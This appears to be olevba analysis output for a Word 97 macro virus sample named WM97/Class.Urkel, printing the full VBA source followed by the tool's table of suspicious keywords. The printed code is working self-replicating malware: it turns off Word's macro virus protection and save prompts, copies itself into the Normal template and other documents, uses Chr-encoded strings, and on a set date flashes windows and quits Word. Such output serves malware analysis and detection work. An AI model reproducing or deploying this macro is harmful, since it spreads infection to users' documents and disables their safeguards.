olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.u-0e506a56b73e5cd9f856789336f756f7290f60f1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.u-0e506a56b73e5cd9f856789336f756f7290f60f1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
On Error GoTo 75
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
I = 0
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
Options.VirusProtection = False
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
Options.SaveNormalPrompt = False
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
Options.ConfirmConversions = False
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
If Day(13) And Month(11) Then Call AutoCrazy
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
ux = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
xu = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
If xu > 94 And ux > 0 Then GoTo 75
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
If xu < 94 Then
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 Set bg = NormalTemplate.VBProject.VBComponents.Item(1)
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 ActiveDocument.VBProject.VBComponents.Item(1).Name = bg.Name
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\urkel.sys"
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
End If
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
If ux = 0 Then Set bg = ActiveDocument.VBProject.VBComponents.Item(1)
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 Infection = Int(Rnd * 50)
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 If Infection = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(85) + Chr(82) + Chr(75) + Chr(69) + Chr(76) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 bg.codemodule.AddFromFile ("c:\urkel.sys")
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 With bg.codemodule
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
    For x = 1 To 4
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
    .deletelines 1
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
    Next x
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 End With
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 If xu < 94 Then
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
    With bg.codemodule
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
    .replaceline 1, "Sub AutoClose()"
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
    .replaceline 99, "Sub ToolsMacro()"
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
    rd = Int(Rnd * 100)
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
If rd = 99 Then .replaceline 69, ".replaceline x, ""'"" & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow"
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
End With
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 End If
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 With bg.codemodule
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
    For x = 2 To 96 Step 2
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
    .replaceline x, "'" & Application.DisplayRecentFiles & Application.StartupPath & Application.ActiveDocument & Application.ActiveWindow
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
    Next x
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 End With
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
75:
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
 If xu > 94 And ux = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
End Sub
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
Private Sub AutoCrazy()
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
Top:
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
I = I + 1
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
On Error Resume Next
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
Application.WindowState = wdWindowStateMinimize
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
Application.WindowState = wdWindowStateMaximize
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
If I < 10 Then GoTo Top
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
Application.Quit
'Истинаc:\program files\microsoft office\office\startupvir.docvir.doc
End Sub

Sub ToolsMacro()
'WM97/Class.Urkel by Virus, HI Vic.
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

